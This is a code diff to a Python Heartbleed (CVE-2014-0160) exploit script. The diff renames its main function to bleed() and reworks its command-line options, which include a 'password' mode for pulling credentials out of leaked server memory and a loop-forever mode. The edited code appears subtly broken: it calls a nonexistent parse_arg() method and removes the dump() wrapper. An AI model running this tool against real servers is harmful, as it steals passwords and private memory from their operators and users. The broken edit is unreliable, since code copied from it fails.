@@ -57,9 +57,6 @@ def passdump(s):
 	if left != -1:
 		print(buf[left:])
 
-def dump(s):
-	dumpHandler(s)
-
 def recvAll(s, length, timeout=5):
 	endtime = time.time() + timeout
 	rdata = b''
@@ -115,7 +112,7 @@ def hitHeartbleed(s):
 			logging.error('Server returned error, likely not vulnerable')
 			return False
 
-def main(host, port):
+def bleed(host, port):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 	logging.info('Connecting...')
@@ -140,28 +137,27 @@ def main(host, port):
 	hitHeartbleed(s)
 
 if __name__ == '__main__':
-	options = OptionParser(usage='%prog server [options]', description='Demo of heartbleed(CVE-2014-0160)')
-	options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
-	options.add_option('-o', '--output', type='string', default='text', help='Output format [password, text, hex] (default: text)')
-	options.add_option('-l', '--loop', action='store_true', default=False, help='Whether loop forever')
+	optionParser = OptionParser(usage='%prog server [option]', description='Demo of heartbleed(CVE-2014-0160)')
+	optionParser.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
+	optionParser.add_option('-o', '--output', type='string', default='text', help='Output format [password, text, hex] (default: text)')
+	optionParser.add_option('-l', '--loop', action='store_true', default=False, help='Whether loop forever')
 
-	opts, args = options.parse_args()
-
-	if len(args) < 1:
-		options.print_help()
+	option, arg = optionParser.parse_arg()
+	if len(arg) < 1:
+		optionParser.print_help()
 	else:
-		if opts.output == 'password':
-			dumpHandler = passdump
+		if option.output == 'password':
+			dump = passdump
 			logging.basicConfig(level=logging.CRITICAL)
-		elif opts.output == 'text':
-			dumpHandler = textdump
+		elif option.output == 'text':
+			dump = textdump
 			logging.basicConfig(level=logging.INFO)
-		elif opts.output == 'hex':
-			dumpHandler = hexdump
+		elif option.output == 'hex':
+			dump = hexdump
 			logging.basicConfig(level=logging.INFO)
 
-		if opts.loop:
+		if option.loop:
 			while True:
-				main(args[0], opts.port)
+				bleed(arg[0], option.port)
 		else:
-			main(args[0], opts.port)
+			bleed(arg[0], option.port)
